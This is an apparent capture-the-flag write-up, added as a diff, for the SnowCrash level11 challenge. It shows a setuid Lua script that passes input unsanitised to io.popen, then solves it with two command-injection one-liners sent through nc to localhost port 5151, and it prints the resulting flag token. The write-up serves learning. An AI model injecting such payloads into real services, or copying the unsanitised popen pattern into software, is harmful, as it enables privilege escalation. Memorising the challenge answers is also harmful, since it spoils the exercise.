@@ -1,0 +1,96 @@
+# Okay lets see what we have by doing a ls -la
+
+level11@SnowCrash:~$ ls -la
+total 16
+dr-xr-x---+ 1 level11 level11  120 Mar  5  2016 .
+d--x--x--x  1 root    users    340 Aug 30  2015 ..
+-r-x------  1 level11 level11  220 Apr  3  2012 .bash_logout
+-r-x------  1 level11 level11 3518 Aug 30  2015 .bashrc
+-r-x------  1 level11 level11  675 Apr  3  2012 .profile
+-rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua
+
+# Lets see what happens when running the file
+
+level11@SnowCrash:~$ ./level11.lua
+lua: ./level11.lua:3: address already in use			# We can see that it is running 
+stack traceback:
+	[C]: in function 'assert'
+	./level11.lua:3: in main chunk
+	[C]: ?
+
+# Lets see whats in level11.lua
+
+level11@SnowCrash:~$ vim level11.lua
+
+  1 #!/usr/bin/env lua
+  2 local socket = require("socket")								# this is important
+  3 local server = assert(socket.bind("127.0.0.1", 5151))			# this is important 
+  4
+  5 function hash(pass)
+  6   prog = io.popen("echo "..pass.." | sha1sum", "r")				# This is the exploit
+  7   data = prog:read("*all")
+  8   prog:close()
+  9
+ 10   data = string.sub(data, 1, 40)
+ 11
+ 12   return data
+ 13 end
+ 14
+ 15
+ 16 while 1 do
+ 17   local client = server:accept()
+ 18   client:send("Password: ")
+ 19   client:settimeout(60)
+ 20   local l, err = client:receive()
+ 21   if not err then
+ 22       print("trying " .. l)
+ 23       local h = hash(l)
+ 24
+ 25       if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
+ 26           client:send("Erf nope..\n");
+ 27       else
+ 28           client:send("Gz you dumb*\n")
+ 29       end
+ 30
+ 31   end
+ 32
+ 33   client:close()
+ 34 end
+
+# We see a few important things in the file.
+	We see on line 3 we have some important information 
+		local server = assert(socket.bind("127.0.0.1", 5151))
+#	We also see that it will funtion in line 5 on line 23 of the program  
+		prog = io.popen("echo "..pass.." | sha1sum", "r")
+	The above line will use io.popen which 
+	Starts program prog in a separated process and returns a file handle that you can use to read data from this program 
+	(if mode is "r", the default) or to write data to this program (if mode is "w"). 
+
+# Lets see if we can exploit it with echo and using nc with our port 5151  and give us the password too
+#	Note localhost 5151 is home in networking
+echo '; getflag > /tmp/Gabe ; echo' | nc localhost 5151 && cat /tmp/Gabe
+
+level11@SnowCrash:~$ echo '; getflag > /tmp/Gabe ; echo' | nc localhost 5151 && cat /tmp/Gabe
+Password: Erf nope..
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+
+# Below is another method for solving the same problem.
+level11@SnowCrash:~$ echo '; getflag | wall' | nc localhost 5151
+
+Broadcast Message from flag11@Snow
+        (somewhere) at 9:14 ...
+
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+
+Erf nope..
+
+# Note wall writes to all terminals 
+
+# What we learnt 
+# this was a echo exploit and wall is awesome 
+
+
+Resources
+http://pgl.yoyo.org/luai/i/io.popen
+https://en.wikipedia.org/wiki/Wall_(Unix)
+https://stackoverflow.com/questions/5239317/io-popen-how-to-wait-for-process-to-finish-in-lua
